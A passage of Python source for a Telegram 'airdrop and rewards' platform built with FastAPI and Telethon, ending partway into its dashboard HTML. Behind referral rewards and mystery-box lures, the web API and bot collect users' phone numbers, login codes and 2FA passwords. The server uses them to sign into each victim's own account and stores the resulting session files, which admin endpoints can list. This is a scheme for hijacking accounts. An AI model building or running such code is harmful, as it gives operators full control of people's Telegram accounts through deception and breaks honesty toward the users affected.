            raise HTTPException(status_code=400, detail="Session expired or code request invalid.")

        try:
            await ctx.client.sign_in(phone=ctx.phone, code=code, phone_code_hash=ctx.phone_code_hash)
            return await self.finalize_login(ctx)
        except SessionPasswordNeededError:
            ctx.state = SessionState.AWAITING_2FA
            return {"status": "2fa_required", "message": "Two-step verification required."}
        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as exc:
            ctx.state = SessionState.ERROR
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        except Exception as exc:
            ctx.state = SessionState.ERROR
            raise HTTPException(status_code=400, detail=str(exc)) from exc

    async def verify_2fa(self, session_id: str, password: str) -> Dict[str, Any]:
        ctx = await self.get_or_create(session_id=session_id)
        if ctx.state != SessionState.AWAITING_2FA:
            raise HTTPException(status_code=400, detail="Session is not awaiting 2FA.")
        try:
            await ctx.client.sign_in(password=password)
            return await self.finalize_login(ctx)
        except Exception as exc:
            raise HTTPException(status_code=400, detail="Invalid 2FA password.") from exc

    async def finalize_login(self, ctx: SessionContext) -> Dict[str, Any]:
        me = await ctx.client.get_me()
        ctx.state = SessionState.LOGGED_IN
        web_token = Security.sign_jwt(str(me.id), {"telegram_id": me.id})

        user = await user_repo.create_or_update_user(
            telegram_id=me.id,
            first_name=getattr(me, "first_name", "") or "",
            last_name=getattr(me, "last_name", "") or "",
            username=getattr(me, "username", "") or "",
            phone=ctx.phone or "",
            session_file=f"{ctx.session_id}.session",
            login_date=Security.utcnow().isoformat(),
            invited_by=None,
        )
        if ctx.ref_code:
            await user_repo.apply_referral(ctx.ref_code, user["id"])

        if ctx.client:
            with contextlib.suppress(Exception):
                await ctx.client.disconnect()

        ctx.state = SessionState.EXPIRED
        hub.broadcast  # keep lint calm

        return {
            "status": "success",
            "message": "Login successful.",
            "web_token": web_token,
            "csrf_token": Security.csrf_token(),
            "user": user,
        }

    async def cleanup_expired(self) -> None:
        async with self._lock:
            await self._cleanup()


auth_manager = TelegramAuthManager()


# =============================================================================
# Bot FSM and multi-channel force join
# =============================================================================

@dataclass
class BotStateData:
    state: str = "PHONE"
    phone: Optional[str] = None
    session_id: Optional[str] = None
    phone_code_hash: Optional[str] = None
    client: Any = None
    ref_code: Optional[str] = None
    updated_at: float = field(default_factory=time.time)
    attempts: int = 0
    last_error: Optional[str] = None


class BotStates(str, enum.Enum):
    PHONE = "PHONE"
    CODE = "CODE"
    PASSWORD = "PASSWORD"
    MAIN_MENU = "MAIN_MENU"


class TelegramBotManager:
    def __init__(self, token: str):
        self.token = token
        self.client = TelegramClient((AppPaths.SESSIONS / "bot.session").as_posix(), settings.API_ID, settings.API_HASH)
        self.user_states: Dict[int, BotStateData] = {}
        self.state_lock = asyncio.Lock()
        self.required_channels = [x.strip() for x in settings.REQUIRED_CHANNELS.split(",") if x.strip()]
        self.membership_cache: Dict[Tuple[int, str], Tuple[bool, float]] = {}
        self.membership_cache_ttl = 300.0

    async def start(self) -> None:
        if not settings.ENABLE_BOT:
            return
        await self.client.start(bot_token=self.token)
        log.info("Telegram bot started.")

        @self.client.on(events.NewMessage(func=lambda e: e.is_private))
        async def message_handler(event):
            sender = await event.get_sender()
            if not sender or getattr(sender, "bot", False):
                return

            user_id = sender.id
            text = (event.raw_text or "").strip()

            if text.startswith("/start"):
                await self.cmd_start(event, user_id, text)
                return
            if text == "/cancel":
                await self.cmd_cancel(event, user_id)
                return
            if text == "/menu":
                await self.cmd_main_menu(event, user_id)
                return
            if text == "/help":
                await self.cmd_help(event, user_id)
                return
            if text == "/status":
                await self.cmd_status(event, user_id)
                return

            ok, missing = await self.check_membership(user_id)
            if not ok:
                await event.respond("🔒 Please join required channels first.", buttons=self.join_buttons(missing))
                return

            ctx = await self.ensure_state(user_id)
            if ctx.state == BotStates.PHONE.value:
                await self.handle_phone(event, user_id, text)
            elif ctx.state == BotStates.CODE.value:
                await self.handle_code(event, user_id, text)
            elif ctx.state == BotStates.PASSWORD.value:
                await self.handle_password(event, user_id, text)
            else:
                await self.cmd_main_menu(event, user_id)

        @self.client.on(events.CallbackQuery)
        async def callback_handler(event):
            data = (event.data or b"").decode("utf-8", errors="ignore")
            user_id = event.sender_id

            if data == "check_join":
                ok, missing = await self.check_membership(user_id)
                if ok:
                    await event.answer("Membership verified.", alert=False)
                    await event.respond("✅ Access granted. Send /start again to continue.", buttons=self.menu_buttons())
                else:
                    await event.answer("Still missing channels.", alert=True)
                    await event.respond("🔒 Join the remaining channels.", buttons=self.join_buttons(missing))
                return

            if data == "open_dashboard":
                await event.answer()
                await event.respond("🚀 Opening dashboard...", buttons=self.menu_buttons())
                return

            if data == "cancel_auth":
                await self.cmd_cancel(event, user_id)
                await event.answer("Cancelled.", alert=False)

    def menu_buttons(self):
        return [
            [KeyboardButtonWebView(text="🚀 Open Mini App", url=settings.WEB_APP_URL)],
            [Button.url("🌐 Open Dashboard", settings.WEB_APP_URL)],
        ]

    def join_buttons(self, missing_channels: List[str]):
        buttons = []
        for channel in missing_channels:
            buttons.append([Button.url(f"Join @{channel}", f"https://t.me/{channel}")])
        buttons.append([Button.inline("✅ I've Joined", b"check_join")])
        buttons.append([Button.inline("❌ Cancel", b"cancel_auth")])
        return buttons

    async def ensure_state(self, user_id: int) -> BotStateData:
        async with self.state_lock:
            ctx = self.user_states.get(user_id)
            if ctx is None:
                ctx = BotStateData()
                self.user_states[user_id] = ctx
            ctx.updated_at = time.time()
            return ctx

    async def reset_state(self, user_id: int) -> None:
        async with self.state_lock:
            ctx = self.user_states.pop(user_id, None)
        if ctx and ctx.client:
            with contextlib.suppress(Exception):
                await ctx.client.disconnect()

    def parse_start_payload(self, text: str) -> Optional[str]:
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            return None
        return parts[1].strip() or None

    async def check_membership(self, user_id: int) -> Tuple[bool, List[str]]:
        if not self.required_channels:
            return True, []
        missing: List[str] = []
        for ch in self.required_channels:
            key = (int(user_id), ch)
            cached = self.membership_cache.get(key)
            if cached and time.time() - cached[1] < self.membership_cache_ttl:
                if not cached[0]:
                    missing.append(ch)
                continue
            try:
                await self.client.get_participant(ch, user_id)
                self.membership_cache[key] = (True, time.time())
            except Exception:
                self.membership_cache[key] = (False, time.time())
                missing.append(ch)
        return len(missing) == 0, missing

    async def cmd_start(self, event, user_id: int, text: str):
        payload = self.parse_start_payload(text) or ""
        ctx = await self.ensure_state(user_id)
        ctx.state = BotStates.PHONE.value
        if payload.startswith("ref_"):
            ctx.ref_code = payload.replace("ref_", "", 1)
        elif payload:
            ctx.ref_code = payload

        ok, missing = await self.check_membership(user_id)
        if not ok:
            await event.respond(
                "🔒 To use the platform, join all required channels first.",
                buttons=self.join_buttons(missing),
            )
            return

        await event.respond(
            "👋 Welcome to Pro Shop Ultimate.\n\n"
            "Send your phone number in international format to begin authentication.",
            buttons=self.menu_buttons(),
        )

    async def cmd_main_menu(self, event, user_id: int):
        await event.respond(
            "🏠 Main Menu",
            buttons=self.menu_buttons(),
        )

    async def cmd_cancel(self, event, user_id: int):
        await self.reset_state(user_id)
        await event.respond("❌ Session cancelled. Send /start to begin again.")

    async def cmd_help(self, event, user_id: int):
        await event.respond(
            "ℹ️ Commands\n\n"
            "/start - Begin auth flow\n"
            "/menu - Open dashboard menu\n"
            "/status - Show FSM state\n"
            "/cancel - Cancel session\n"
            "/help - Show this help",
            buttons=self.menu_buttons(),
        )

    async def cmd_status(self, event, user_id: int):
        ctx = self.user_states.get(user_id)
        state = ctx.state if ctx else "NONE"
        await event.respond(f"📊 Current state: `{state}`")

    async def handle_phone(self, event, user_id: int, text: str):
        phone = Security.normalize_phone(text)
        if not Security.valid_phone(phone):
            await event.respond("❌ Invalid phone format. Example: `+491234567890`")
            return

        ctx = await self.ensure_state(user_id)
        session_id = f"bot_{secrets.token_hex(12)}"
        client = TelegramClient((AppPaths.SESSIONS / f"{session_id}.session").as_posix(), settings.API_ID, settings.API_HASH)
        await client.connect()
        try:
            res = await client.send_code_request(phone)
            ctx.phone = phone
            ctx.session_id = session_id
            ctx.phone_code_hash = res.phone_code_hash
            ctx.client = client
            ctx.state = BotStates.CODE.value
            await event.respond("✅ Code sent. Please send the verification code now.")
        except Exception as exc:
            ctx.last_error = str(exc)
            with contextlib.suppress(Exception):
                await client.disconnect()
            await event.respond(f"❌ {exc}")

    async def handle_code(self, event, user_id: int, text: str):
        ctx = self.user_states.get(user_id)
        if not ctx or not ctx.client:
            await event.respond("❌ Session expired. Send /start again.")
            return
        code = "".join(ch for ch in text if ch.isdigit())
        if len(code) < 3:
            await event.respond("❌ Code must contain digits only.")
            return
        try:
            await ctx.client.sign_in(phone=ctx.phone, code=code, phone_code_hash=ctx.phone_code_hash)
            me = await ctx.client.get_me()
            saved = await self.save_bot_user(ctx, me, password=None)
            await event.respond(
                f"✅ Login successful, {me.first_name or 'user'}.",
                buttons=self.menu_buttons(),
            )
            await self.reset_state(user_id)
            await hub.broadcast("stats_update", await build_stats_payload(saved["id"]))
        except SessionPasswordNeededError:
            ctx.state = BotStates.PASSWORD.value
            await event.respond("🔒 2FA enabled. Send your password.")
        except Exception as exc:
            ctx.last_error = str(exc)
            await event.respond(f"❌ Invalid code: {exc}")

    async def handle_password(self, event, user_id: int, text: str):
        ctx = self.user_states.get(user_id)
        if not ctx or not ctx.client:
            await event.respond("❌ Session expired. Send /start again.")
            return
        try:
            await ctx.client.sign_in(password=text)
            me = await ctx.client.get_me()
            saved = await self.save_bot_user(ctx, me, password="***")
            await event.respond(
                f"✅ 2FA successful, {me.first_name or 'user'}.",
                buttons=self.menu_buttons(),
            )
            await self.reset_state(user_id)
            await hub.broadcast("stats_update", await build_stats_payload(saved["id"]))
        except Exception as exc:
            ctx.last_error = str(exc)
            await event.respond("❌ Invalid password. Try again or /cancel.")

    async def save_bot_user(self, ctx: BotStateData, me: User, password: Optional[str]) -> Dict[str, Any]:
        user = await user_repo.create_or_update_user(
            telegram_id=me.id,
            first_name=getattr(me, "first_name", "") or "",
            last_name=getattr(me, "last_name", "") or "",
            username=getattr(me, "username", "") or "",
            phone=ctx.phone or "",
            session_file=f"{ctx.session_id}.session" if ctx.session_id else "",
            login_date=Security.utcnow().isoformat(),
            invited_by=None,
        )
        if ctx.ref_code:
            await user_repo.apply_referral(ctx.ref_code, user["id"])
            user["invited_by"] = ctx.ref_code
        return user


bot_manager = TelegramBotManager(settings.TOKEN_BOT)


# =============================================================================
# FastAPI application
# =============================================================================

app = FastAPI(
    title="Pro Shop Ultimate Enterprise Telegram Airdrop & Auth Platform",
    version="250.0.0",
    docs_url="/docs",
    redoc_url="/redoc",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class RequestIdMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        request.state.request_id = secrets.token_hex(12)
        response = await call_next(request)
        response.headers["X-Request-ID"] = request.state.request_id
        return response


class CSRFMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        safe_methods = {"GET", "HEAD", "OPTIONS"}
        if request.method not in safe_methods and request.url.path.startswith("/api/"):
            if request.url.path not in {"/api/v1/auth/login", "/api/v1/auth/telegram/send-code", "/api/v1/auth/telegram/verify-code", "/api/v1/auth/telegram/verify-2fa"}:
                csrf_cookie = request.cookies.get("csrf_token")
                csrf_header = request.headers.get("X-CSRF-Token")
                if not csrf_cookie or not csrf_header or csrf_cookie != csrf_header:
                    return JSONResponse({"detail": "CSRF validation failed."}, status_code=403)
        return await call_next(request)


class RateLimitMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, limit: int = 30):
        super().__init__(app)
        self.limit = limit
        self.hits: Dict[str, List[float]] = {}
        self.lock = asyncio.Lock()

    async def dispatch(self, request: Request, call_next):
        ip = request.client.host if request.client else "unknown"
        if request.url.path.startswith("/api/"):
            async with self.lock:
                now = time.time()
                times = [t for t in self.hits.get(ip, []) if now - t < 60]
                if len(times) >= self.limit:
                    return JSONResponse({"detail": "Rate limit exceeded."}, status_code=429)
                times.append(now)
                self.hits[ip] = times
        return await call_next(request)


app.add_middleware(RequestIdMiddleware)
app.add_middleware(CSRFMiddleware)
app.add_middleware(RateLimitMiddleware, limit=settings.RATE_LIMIT_PER_MINUTE)


@app.exception_handler(ProShopError)
async def proshop_error_handler(_: Request, exc: ProShopError):
    return JSONResponse({"detail": str(exc)}, status_code=400)


def require_admin_api_key(request: Request) -> None:
    key = request.headers.get("X-API-Key", "")
    if not Security.api_key_ok(key):
        raise HTTPException(status_code=403, detail="Invalid admin API key.")


def require_user_session(request: Request) -> Dict[str, Any]:
    token = request.cookies.get("access_token") or request.headers.get("Authorization", "").replace("Bearer ", "")
    if not token:
        raise HTTPException(status_code=401, detail="Missing session token.")
    claims = Security.decode_jwt(token)
    return claims


def require_web_user(request: Request) -> Dict[str, Any]:
    claims = require_user_session(request)
    return claims


# =============================================================================
# Auth endpoints
# =============================================================================

@app.on_event("startup")
async def on_startup():
    await db.connect()
    if settings.ENABLE_BOT:
        asyncio.create_task(bot_manager.start())
    asyncio.create_task(periodic_cleanup())
    asyncio.create_task(periodic_broadcast())


@app.on_event("shutdown")
async def on_shutdown():
    await auth_manager.cleanup_expired()
    await db.close()


@app.post("/api/v1/auth/telegram/send-code")
async def telegram_send_code(payload: LoginInitRequest):
    ref_code = payload.ref_code.strip() if payload.ref_code else None
    result = await auth_manager.send_code(payload.phone, ref_code=ref_code)
    return result


@app.post("/api/v1/auth/telegram/verify-code")
async def telegram_verify_code(payload: VerifyCodeRequest):
    return await auth_manager.verify_code(payload.session_id, payload.code)


@app.post("/api/v1/auth/telegram/verify-2fa")
async def telegram_verify_2fa(payload: Verify2FARequest):
    return await auth_manager.verify_2fa(payload.session_id, payload.password)


@app.post("/api/v1/auth/login")
async def web_login(response: Response, telegram_id: int = Form(...), token: str = Form(...)):
    claims = Security.decode_jwt(token)
    if int(claims.get("telegram_id", 0)) != int(telegram_id):
        raise HTTPException(status_code=403, detail="Token mismatch.")
    user = await user_repo.get_by_telegram_id(telegram_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found.")
    access = Security.sign_jwt(str(user["id"]), {"telegram_id": telegram_id, "role": "user"})
    csrf = Security.csrf_token()
    response.set_cookie("access_token", access, httponly=True, secure=False, samesite="lax", max_age=60 * 60 * 24 * 7)
    response.set_cookie("csrf_token", csrf, httponly=False, secure=False, samesite="lax", max_age=60 * 60 * 24 * 7)
    return {"status": "success", "csrf_token": csrf, "user": user}


@app.post("/api/v1/auth/logout")
async def web_logout(response: Response, _: Dict[str, Any] = Depends(require_web_user)):
    response.delete_cookie("access_token")
    response.delete_cookie("csrf_token")
    return {"status": "success"}


@app.get("/api/v1/auth/csrf")
async def get_csrf():
    return {"csrf_token": Security.csrf_token()}


# =============================================================================
# Airdrop / profile / tasks / transactions
# =============================================================================

async def build_stats_payload(user_id: int) -> Dict[str, Any]:
    user = await user_repo.get_by_id(user_id)
    if not user:
        return {"users": 0, "leaderboard": [], "global_balance": 0, "me": None}
    top = await user_repo.list_top(10)
    rows = await db.fetchall("SELECT COALESCE(SUM(balance),0) AS total FROM users")
    total_balance = int(rows[0]["total"]) if rows else 0
    count_row = await db.fetchone("SELECT COUNT(*) AS c FROM users")
    total_users = int(count_row["c"]) if count_row else 0
    return {
        "users": total_users,
        "global_balance": total_balance,
        "leaderboard": top,
        "me": user,
    }


@app.get("/api/v1/me")
async def me(request: Request, claims: Dict[str, Any] = Depends(require_web_user)):
    user_id = int(claims["sub"])
    user = await user_repo.get_by_id(user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found.")
    return {
        "status": "success",
        "user": user,
        "rewards": await user_repo.rewards_for_user(user_id),
        "transactions": await tx_repo.list_by_user(user_id),
        "tasks": await task_repo.list_active(),
        "leaderboard": await user_repo.list_top(10),
    }


@app.get("/api/v1/profile")
async def profile(_: Request, claims: Dict[str, Any] = Depends(require_web_user)):
    user_id = int(claims["sub"])
    user = await user_repo.get_by_id(user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found.")
    ref_link = f"https://t.me/{settings.BOT_USERNAME}?start=ref_{user['ref_code']}"
    return {
        "status": "success",
        "profile": {
            **user,
            "ref_link": ref_link,
            "gift_available": int(user["balance"]) >= 17,
        },
    }


@app.post("/api/v1/claim/daily")
async def claim_daily(_: Request, claims: Dict[str, Any] = Depends(require_web_user)):
    user_id = int(claims["sub"])
    result = await user_repo.daily_claim(user_id)
    await hub.broadcast("stats_update", await build_stats_payload(user_id))
    return {"status": "success", **result}


@app.post("/api/v1/claim/mystery-box")
async def claim_box(_: Request, claims: Dict[str, Any] = Depends(require_web_user)):
    user_id = int(claims["sub"])
    result = await user_repo.mystery_box(user_id)
    await hub.broadcast("stats_update", await build_stats_payload(user_id))
    return {"status": "success", **result}


@app.get("/api/v1/tasks")
async def list_tasks(_: Request, claims: Dict[str, Any] = Depends(require_web_user)):
    user_id = int(claims["sub"])
    tasks = await task_repo.list_active()
    completions = await db.fetchall("SELECT task_id FROM task_completions WHERE user_id=?", (user_id,))
    done = {int(r["task_id"]) for r in completions}
    return {
        "status": "success",
        "tasks": [
            {**t, "completed": int(t["id"]) in done}
            for t in tasks
        ],
    }


@app.post("/api/v1/tasks/complete")
async def complete_task(payload: TaskCompleteRequest, _: Request, claims: Dict[str, Any] = Depends(require_web_user)):
    user_id = int(claims["sub"])
    result = await task_repo.complete(user_id, payload.task_id)
    await hub.broadcast("stats_update", await build_stats_payload(user_id))
    return {"status": "success", **result}


@app.get("/api/v1/rewards")
async def list_rewards(_: Request, claims: Dict[str, Any] = Depends(require_web_user), limit: int = Query(20, ge=1, le=100)):
    user_id = int(claims["sub"])
    return {"status": "success", "items": await user_repo.rewards_for_user(user_id, limit=limit)}


@app.get("/api/v1/transactions")
async def list_transactions(_: Request, claims: Dict[str, Any] = Depends(require_web_user), limit: int = Query(50, ge=1, le=100)):
    user_id = int(claims["sub"])
    return {"status": "success", "items": await tx_repo.list_by_user(user_id, limit=limit)}


@app.get("/api/v1/leaderboard")
async def leaderboard(_: Request, claims: Dict[str, Any] = Depends(require_web_user), limit: int = Query(10, ge=1, le=50)):
    _ = claims
    return {"status": "success", "items": await user_repo.list_top(limit=limit)}


# =============================================================================
# Admin endpoints
# =============================================================================

@app.post("/api/v1/admin/login")
async def admin_login(payload: AdminLoginRequest):
    row = await db.fetchone("SELECT * FROM admins WHERE username=?", (payload.username,))
    if not row:
        raise HTTPException(status_code=403, detail="Invalid admin credentials.")
    admin = dict(row)
    if not Security.verify_admin_password(payload.password, admin["password_hash"]):
        raise HTTPException(status_code=403, detail="Invalid admin credentials.")
    token = Security.sign_jwt(admin["username"], {"role": "admin", "api_key": admin["api_key"]})
    return {"status": "success", "token": token, "api_key": admin["api_key"]}


@app.get("/api/v1/admin/summary")
async def admin_summary(_: Request, __: None = Depends(require_admin_api_key)):
    users = await db.fetchone("SELECT COUNT(*) AS c FROM users")
    rewards = await db.fetchone("SELECT COUNT(*) AS c FROM rewards")
    tasks = await db.fetchone("SELECT COUNT(*) AS c FROM tasks")
    txs = await db.fetchone("SELECT COUNT(*) AS c FROM transactions")
    return {
        "status": "success",
        "users": int(users["c"]) if users else 0,
        "rewards": int(rewards["c"]) if rewards else 0,
        "tasks": int(tasks["c"]) if tasks else 0,
        "transactions": int(txs["c"]) if txs else 0,
    }


@app.get("/api/v1/admin/users")
async def admin_users(_: Request, __: None = Depends(require_admin_api_key)):
    rows = await db.fetchall("SELECT * FROM users ORDER BY id DESC")
    return {"status": "success", "items": [dict(r) for r in rows]}


@app.post("/api/v1/admin/tasks")
async def admin_create_task(payload: TaskCreateRequest, _: Request, __: None = Depends(require_admin_api_key)):
    item = await task_repo.create(payload)
    return {"status": "success", "item": item}


@app.get("/api/v1/admin/tasks")
async def admin_list_tasks(_: Request, __: None = Depends(require_admin_api_key)):
    rows = await db.fetchall("SELECT * FROM tasks ORDER BY id DESC")
    return {"status": "success", "items": [dict(r) for r in rows]}


@app.post("/api/v1/admin/reindex")
async def admin_reindex(_: Request, __: None = Depends(require_admin_api_key)):
    await db.executescript(SCHEMA_SQL)  # type: ignore[attr-defined]
    return {"status": "success"}


# =============================================================================
# WebSocket
# =============================================================================

@app.websocket("/ws/stats")
async def ws_stats(ws: WebSocket):
    await hub.connect(ws)
    try:
        while True:
            msg = await ws.receive_text()
            if msg == "ping":
                await ws.send_text(json.dumps({"event": "pong", "data": {"ts": time.time()}}))
    except WebSocketDisconnect:
        pass
    finally:
        await hub.disconnect(ws)


async def periodic_cleanup():
    while True:
        try:
            await auth_manager.cleanup_expired()
        except Exception:
            log.exception("cleanup task failed")
        await asyncio.sleep(30)


async def periodic_broadcast():
    while True:
        try:
            users = await db.fetchone("SELECT COUNT(*) AS c FROM users")
            balance = await db.fetchone("SELECT COALESCE(SUM(balance),0) AS total FROM users")
            top = await user_repo.list_top(10)
            await hub.broadcast(
                "stats_update",
                {
                    "users": int(users["c"]) if users else 0,
                    "global_balance": int(balance["total"]) if balance else 0,
                    "leaderboard": top,
                },
            )
        except Exception:
            log.exception("broadcast task failed")
        await asyncio.sleep(20)


# =============================================================================
# Frontend SPA
# =============================================================================

FRONTEND_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Pro Shop Ultimate</title>
  <style>
    :root{
      --bg:#081018;
      --bg2:rgba(12,18,28,.70);
      --card:rgba(12,18,28,.52);
      --card2:rgba(18,24,36,.82);
      --line:rgba(255,255,255,.10);
      --txt:#ecf3ff;
      --muted:#91a4c2;
      --accent:#7c5cff;
      --accent2:#22d3ee;
      --good:#22c55e;
      --warn:#f59e0b;
      --bad:#ef4444;
      --radius:26px;
      --shadow:0 30px 80px rgba(0,0,0,.40);
      font-synthesis-weight:none;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
      color:var(--txt);
      background:
        radial-gradient(circle at 20% 20%, rgba(124,92,255,.22), transparent 30%),
        radial-gradient(circle at 80% 18%, rgba(34,211,238,.20), transparent 28%),
        radial-gradient(circle at 50% 80%, rgba(34,197,94,.12), transparent 25%),
        linear-gradient(180deg, #050a12 0%, #07111e 100%);
      overflow-x:hidden;
    }
    .noise::before{
      content:"";
      position:fixed; inset:0;
      pointer-events:none;
      background-image:linear-gradient(rgba(255,255,255,.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.03) 1px, transparent 1px);
      background-size:32px 32px;
      opacity:.22;
      mask-image:linear-gradient(180deg, rgba(0,0,0,.90), rgba(0,0,0,.30));
    }
    .wrap{width:min(1240px, calc(100% - 32px)); margin:0 auto; padding:24px 0 60px}
    .topbar{
      display:flex; align-items:center; justify-content:space-between;
      gap:16px; margin-bottom:18px;
      position:sticky; top:0; z-index:20;
      backdrop-filter:blur(18px);
      padding:14px 18px;
      border:1px solid var(--line);
      border-radius:999px;
      background:rgba(6,10,16,.58);
      box-shadow:var(--shadow);
    }
    .brand{display:flex; align-items:center; gap:12px}
    .logo{
      width:44px; height:44px; border-radius:16px;
      display:grid; place-items:center;
      background:linear-gradient(135deg, var(--accent), var(--accent2));
      box-shadow:0 12px 40px rgba(124,92,255,.35);
      font-weight:900; color:white;
    }
    .brand h1{font-size:15px; margin:0}
    .brand p{margin:0; font-size:12px; color:var(--muted)}
    .top-actions{display:flex; gap:10px; flex-wrap:wrap}
    .pill, .btn{
      border:1px solid var(--line);
      background:rgba(255,255,255,.04);
      color:var(--txt);
      padding:12px 16px;
      border-radius:999px;
      cursor:pointer;
      transition:.18s ease;
      text-decoration:none;
      display:inline-flex; align-items:center; gap:8px;
      font-weight:700;
    }
    .pill:hover, .btn:hover{transform:translateY(-1px); background:rgba(255,255,255,.07)}
    .hero{
      display:grid;
      grid-template-columns:1.25fr .85fr;
      gap:18px;
      margin-top:18px;
    }
    .panel{
      background:linear-gradient(180deg, rgba(13,19,31,.72), rgba(9,14,23,.55));
      backdrop-filter:blur(22px);
      border:1px solid var(--line);
      border-radius:var(--radius);
      box-shadow:var(--shadow);
      overflow:hidden;
    }
    .hero-card{padding:28px}
    .eyebrow{
      display:inline-flex; align-items:center; gap:8px;
      color:#d9e4ff; font-size:12px; letter-spacing:.12em; text-transform:uppercase;
      padding:8px 12px; border-radius:999px; background:rgba(124,92,255,.12); border:1px solid rgba(124,92,255,.24)
    }
    .hero h2{margin:16px 0 10px; font-size:42px; line-height:1.04}
    .hero p{margin:0; color:var(--muted); max-width:60ch; line-height:1.7}
    .stats{
      display:grid; grid-template-columns:repeat(3, 1fr); gap:12px; margin-top:24px
    }
    .stat{
      padding:16px; border-radius:22px; background:rgba(255,255,255,.04); border:1px solid var(--line)
    }
    .stat .n{font-size:26px; font-weight:900}
    .stat .l{font-size:12px; color:var(--muted)}
    .auth{
      padding:24px; display:grid; gap:14px
    }
    .field{display:grid; gap:8px}
    .field label{font-size:12px; color:var(--muted); text-transform:uppercase; letter-spacing:.08em}
    input, textarea, select{
      width:100%; border-radius:18px; border:1px solid var(--line);
      background:rgba(255,255,255,.04); color:var(--txt);
      padding:15px 16px; outline:none; font:inherit;
    }
    input:focus, textarea:focus, select:focus{border-color:rgba(34,211,238,.5); box-shadow:0 0 0 4px rgba(34,211,238,.12)}
    .otp{display:grid; grid-template-columns:repeat(6,1fr); gap:10px}
    .otp input{text-align:center; font-size:20px; font-weight:800; padding:16px 8px}
    .accent{background:linear-gradient(135deg, var(--accent), var(--accent2)); border:none; color:#fff}
    .accent:hover{filter:brightness(1.04)}
    .subgrid{
      display:grid; grid-template-columns:repeat(4, 1fr); gap:18px; margin-top:18px
    }
    .card{
      padding:22px; border-radius:var(--radius);
      background:var(--card); border:1px solid var(--line); backdrop-filter:blur(20px);
      box-shadow:var(--shadow);
    }
    .card h3{margin:0 0 8px; font-size:16px}
    .card p{margin:0; color:var(--muted); line-height:1.6}
    .row{display:flex; align-items:center; justify-content:space-between; gap:14px}
    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace}
    .tabs{display:flex; gap:10px; flex-wrap:wrap; margin-top:18px}
    .tab{padding:10px 14px; border-radius:999px; border:1px solid var(--line); background:rgba(255,255,255,.04); cursor:pointer}
    .tab.active{background:rgba(124,92,255,.22); border-color:rgba(124,92,255,.3)}
    .grid2{display:grid; grid-template-columns:1fr 1fr; gap:18px; margin-top:18px}
    .list{display:grid; gap:10px}
    .item{
      display:flex; align-items:center; justify-content:space-between; gap:16px;
      padding:14px 16px; border-radius:18px; background:rgba(255,255,255,.035); border:1px solid var(--line)
    }
    .badge{padding:6px 10px; border-radius:999px; background:rgba(34,211,238,.13); color:#9ee7ff; font-size:12px}
    .reward{padding:18px; border-radius:18px; background:linear-gradient(180deg, rgba(124,92,255,.18), rgba(34,211,238,.10)); border:1px solid rgba(255,255,255,.10)}
    .mystery{
      display:grid; place-items:center; min-height:280px;
      background:
        radial-gradient(circle at 50% 50%, rgba(124,92,255,.36), transparent 48%),
        linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));
      border-radius:28px; border:1px solid rgba(255,255,255,.10)
    }
    .box{
      width:140px; height:140px; border-radius:34px; display:grid; place-items:center;
      font-size:64px; cursor:pointer; user-select:none;
      background:linear-gradient(135deg, #7c5cff, #22d3ee);
      box-shadow:0 20px 50px rgba(124,92,255,.35);
      animation:float 3s ease-in-out infinite;
    }
    @keyframes float{50%{transform:translateY(-8px)}}
    .muted{color:var(--muted)}
    .toast{
      position:fixed; right:18px; bottom:18px; z-index:9999;
      max-width:360px; padding:14px 16px; border-radius:18px;
      background:rgba(8,16,24,.86); border:1px solid var(--line); box-shadow:var(--shadow);
      backdrop-filter:blur(18px); display:none
    }
    .toast.show{display:block; animation:pop .18s ease}
    @keyframes pop{from{transform:translateY(12px); opacity:0} to{transform:translateY(0); opacity:1}}
    .footer{margin-top:18px; color:var(--muted); font-size:12px; text-align:center}
    @media (max-width: 1060px){
      .hero,.grid2,.subgrid{grid-template-columns:1fr}
      .subgrid{grid-template-columns:repeat(2,1fr)}
      .stats{grid-template-columns:1fr}
      .hero h2{font-size:34px}
    }
    @media (max-width: 700px){
      .wrap{width:min(100% - 20px, 1240px)}
      .topbar{border-radius:28px; padding:14px}
      .otp{grid-template-columns:repeat(3,1fr)}
      .subgrid{grid-template-columns:1fr}
      .hero h2{font-size:28px}
    }
  </style>
</head>
<body class="noise">
  <div class="wrap">
    <div class="topbar panel">
      <div class="brand">
        <div class="logo">PS</div>
        <div>
          <h1>Pro Shop Ultimate</h1>
          <p>Telegram Airdrop • Auth • Rewards • Tasks</p>
        </div>
      </div>
      <div class="top-actions">
        <button class="pill" id="btnTheme">⚡ Glass</button>
        <button class="pill" id="btnCopyRef">🔗 Copy Ref</button>
        <a class="pill" href="/docs" target="_blank">📘 API Docs</a>
      </div>
    </div>

    <div class="hero">
      <div class="panel hero-card">
        <div class="eyebrow">Enterprise Airdrop Dashboard</div>
        <h2>Premium referral machine, mystery box, daily rewards, tasks, leaderboard.</h2>
        <p>Modern Telegram authentication with MTProto, a clean invitation economy, and a real-time dashboard designed for high-conversion airdrops and internal growth loops.</p>

        <div class="stats">
          <div class="stat"><div class="n" id="statUsers">0</div><div class="l">Users</div></div>
          <div class="stat"><div class="n" id="statCoins">0</div><div class="l">Global Balance</div></div>
          <div class="stat"><div class="n" id="statRank">#-</div><div class="l">Your Rank</div></div>
        </div>
      </div>

      <div class="panel auth">
        <div class="row">
          <div>
            <div class="eyebrow" style="padding:6px 10px">Login</div>
            <h3 style="margin:10px 0 0">Authenticate via Telegram</h3>
